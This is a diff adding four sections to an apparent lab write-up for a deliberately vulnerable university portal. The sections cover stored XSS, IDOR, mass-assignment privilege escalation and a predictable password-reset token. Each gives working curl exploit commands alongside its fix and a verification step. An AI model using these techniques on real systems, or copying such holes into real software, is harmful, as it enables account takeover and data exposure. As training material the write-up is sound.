@@ -436,6 +436,134 @@ an attacker reached the database directly, the #9 ledger would flag the change.)
 
 ---
 
+## 11. Stored XSS — announcements feed
+
+**Where:** `app.py → h_post_announcement` (storage) and `static/app.js → announceBody`
+(output). Staff post to a shared news feed; the body is stored verbatim and rendered
+for every reader on the Announcements page and the dashboard widget.
+
+```js
+// VULN: the body is injected as raw HTML
+function announceBody(body) { return MODE === "secure" ? esc(body) : (body || ""); }
+```
+
+**Exploit** — as a professor (or a student who escalated via #5/#13), post an
+announcement whose body is a script. It runs in every reader's browser, including
+the admin's:
+
+```bash
+PT=$(curl -s -X POST $B/api/login -H 'Content-Type: application/json' \
+     -d '{"username":"prof_jones","password":"teach456"}' | python3 -c 'import sys,json;print(json.load(sys.stdin)["token"])')
+curl -s -X POST $B/api/announcements -H "Authorization: Bearer $PT" \
+  -H 'Content-Type: application/json' \
+  -d '{"title":"Timetable","body":"<img src=x onerror=\"document.title=document.cookie\">"}'
+# open the Announcements page in the vuln build -> the payload fires
+```
+
+**Impact:** session/token theft, actions performed as any viewer (stored, so it hits
+everyone who loads the feed). **Fix (secure build):** HTML-escape on output
+(`esc`) — the payload renders as inert text. **Verify:** the same announcement
+shows as literal text in the secure build and never executes.
+
+---
+
+## 12. IDOR — read any student's document
+
+**Where:** `app.py → h_get_document` (`GET /api/documents/<id>`). A student requests
+official documents (attestation, transcript); an approved one is viewable by id, with
+no check that the caller owns it.
+
+**Exploit** — as `alice`, read another student's document by walking the id (ids
+appear in your own request list):
+
+```bash
+curl -s $B/api/documents/1 -H "Authorization: Bearer $TOK"   # not alice's -> leaked
+```
+
+**Impact:** disclosure of other students' documents (name, e-mail, reference).
+**Fix (secure build):** a student may read only their own document; staff/admin any.
+
+```python
+if me["role"] == "student" and doc["student_id"] != me["id"]:
+    return 403
+```
+
+**Verify:** in the secure build the foreign id returns `403`; your own returns `200`.
+
+---
+
+## 13. Mass assignment — profile update sets privileged columns
+
+**Where:** `app.py → h_update_profile` (`POST /api/profile`). The vuln build writes
+every key in the body to the user row; the form only exposes name/email/phone/address.
+
+```python
+# VULN
+fields = [k for k in b if k in cols and k != "id"]      # includes role, password_hash…
+conn.execute("UPDATE users SET " + ", ".join(f"{k} = ?" for k in fields) + " WHERE id = ?", …)
+```
+
+**Exploit** — as the student `alice`, add `role` (or `password_hash`) to the request:
+
+```bash
+curl -s -X POST $B/api/profile -H "Authorization: Bearer $TOK" \
+  -H 'Content-Type: application/json' -d '{"full_name":"Alice","role":"admin"}'
+curl -s $B/api/me -H "Authorization: Bearer $TOK"        # -> role: admin
+```
+
+**Impact:** privilege escalation to admin from an ordinary account. **Fix (secure
+build):** write only an explicit whitelist (`full_name, email, phone, address`);
+`role`, `id`, `password_hash`, `username` are never taken from the request.
+**Verify:** the same request leaves `role` as `student`.
+
+---
+
+## 14. Predictable password-reset token
+
+**Where:** `app.py → _reset_token` / `h_reset_request` / `h_reset_confirm`.
+
+```python
+# VULN: token is a function of the (public) username, no randomness, no expiry
+return hashlib.md5(("reset:" + username).encode()).hexdigest()[:12]
+```
+
+**Exploit** — take over any account knowing only its username (public in the
+directory). Trigger a reset, then compute the same token offline and set a new
+password:
+
+```bash
+curl -s -X POST $B/api/password-reset/request -H 'Content-Type: application/json' -d '{"username":"carol"}'
+TOK=$(python3 -c "import hashlib;print(hashlib.md5(b'reset:carol').hexdigest()[:12])")
+curl -s -X POST $B/api/password-reset/confirm  -H 'Content-Type: application/json' \
+  -d "{\"token\":\"$TOK\",\"new_password\":\"pwned123\"}"    # -> carol's password is now pwned123
+```
+
+(The vuln build also returns the token in the response.) **Impact:** account
+takeover of anyone. **Fix (secure build):** a cryptographically random
+`secrets.token_urlsafe` token, stored hashed, single-use, expiring in 15 minutes,
+never returned in the response and with a response that doesn't reveal whether the
+account exists. **Verify:** the guessed MD5 token returns `400` on the secure build;
+only the random token from the server log works, once.
+
+---
+
+## Surfaced realistically (not new flaws)
+
+Three existing flaws were moved off-screen so they're found the way they would be in
+a real engagement, without changing whether they exist:
+
+- **#2/#6c credential leak** — the vuln `GET /api/admin/users` still returns
+  `password_hash`, but the Users page no longer renders it; you find it in the
+  Network tab / Burp, not in a visible column.
+- **IDOR recon (#4, #12)** — internal ids are no longer printed in the UI (directory,
+  dashboards, dropdowns, profile). They still appear in JSON and in the chat URL,
+  which is the normal recon path.
+- **#5 role escalation** — the disabled "Account type" field was removed from the
+  signup form; the client simply never sends a role, and the attacker discovers the
+  vuln build accepts one by adding it to the request.
+
+---
+
 ## Summary
 
 | # | Vulnerability | Fix |
@@ -450,3 +578,11 @@ an attacker reached the database directly, the #9 ledger would flag the change.)
 | 8 | No signatures / no encryption at rest | Ed25519 signatures + AES-GCM |
 | 9 | No integrity anchoring (tampering undetected) | issuer-only smart contract: anchor hashes on write, verify on read |
 | 10 | SQLi in people search (stacked write → grade change) | parameterized query, single statement |
+| 11 | Stored XSS in announcements | HTML-escape on output |
+| 12 | IDOR on documents | ownership/role check |
+| 13 | Mass assignment on profile update | server-side field whitelist |
+| 14 | Predictable password-reset token | random, hashed, single-use, expiring token |
+
+**Secure-build business rules** (flaws only in the vuln build, not numbered attacks):
+grades must be numeric and within 0–20; certificates enforce a minimum grade
+(Achievement ≥ 10, Honors ≥ 16); the session returns to login on token expiry.
